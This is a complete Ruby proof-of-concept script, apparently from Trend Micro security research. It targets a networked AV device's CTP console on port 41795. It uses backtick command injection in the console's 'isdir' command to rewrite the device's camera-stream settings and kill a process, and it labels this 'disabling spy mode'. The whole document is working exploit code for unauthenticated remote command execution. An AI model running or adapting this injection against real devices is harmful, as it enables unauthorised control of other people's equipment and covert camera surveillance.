#!/usr/bin/env ruby
# coding: utf-8
require 'socket'
require 'expect'

if not ARGV[0]
  puts "no target ip specified"
  exit(-1)
end

ADDR = ARGV[0]
CTP_PORT = 41795

puts "Disabling spy mode..."
begin
  s = TCPSocket.new(ADDR,CTP_PORT)

  s.write("\r\n")
  if s.expect(/>$/,1)
    s.write("isdir `sed -i 's/\"camStreamEnable\": true,/\"camStreamEnable\": false,/' /data/CresStreamSvc/userSettings`\r\n")
    if s.expect(/FALSE/,1)
      s.write("isdir `killall csio`\r\n")
      if s.expect(/FALSE/,1)
        puts "Spy mode disabled."
      else
        puts "Unable to close video stream..."
      end
    end
    s.write("bye\r\n")
  else
    puts "CTP console closed..."
  end
          
  s.close
rescue Errno::ECONNREFUSED
  puts "CTP console closed..."
end

# © 2016, Trend Micro Incorporated
